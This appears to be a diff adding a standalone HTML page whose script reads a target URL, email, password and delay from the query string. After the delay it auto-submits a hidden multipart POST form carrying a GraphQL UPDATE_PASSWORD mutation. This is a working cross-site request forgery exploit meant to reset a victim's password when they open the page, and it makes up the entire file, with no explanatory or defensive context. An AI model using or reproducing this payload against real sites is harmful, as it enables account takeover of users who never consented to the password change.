@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+// Parse URL parameters
+const params = new URLSearchParams(window.location.search);
+const targetUrl = params.get('targetUrl');
+const email = params.get('email');
+const password = params.get('password');
+const autoRun = params.get('autoRun');
+const delay = parseInt(params.get('delay')) * 1000;
+
+if (autoRun === 'true') {
+    setTimeout(() => {
+        // Create form dynamically
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = targetUrl;
+        form.enctype = 'multipart/form-data';
+        
+        const queryInput = document.createElement('input');
+        queryInput.type = 'hidden';
+        queryInput.name = 'query';
+        queryInput.value = `mutation{UPDATE_PASSWORD(email:"${email}",password:"${password}")}`;
+        
+        form.appendChild(queryInput);
+        document.body.appendChild(form);
+        form.submit();
+    }, delay);
+}
+</script>
+</body>
+</html>
